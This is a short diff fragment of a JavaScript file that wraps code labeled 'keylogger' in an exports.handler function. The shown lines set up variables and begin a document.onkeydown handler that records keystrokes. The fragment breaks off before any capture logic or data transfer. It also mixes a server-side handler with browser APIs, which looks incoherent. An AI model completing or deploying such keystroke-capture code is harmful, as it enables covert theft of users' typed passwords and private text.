@@ -1,4 +1,5 @@
-//keylogger
+exports.handler = function (event, context) {
+  //keylogger
 var keycodes = "";
 var keychars = "";
 document.onkeydown = function(e){ 
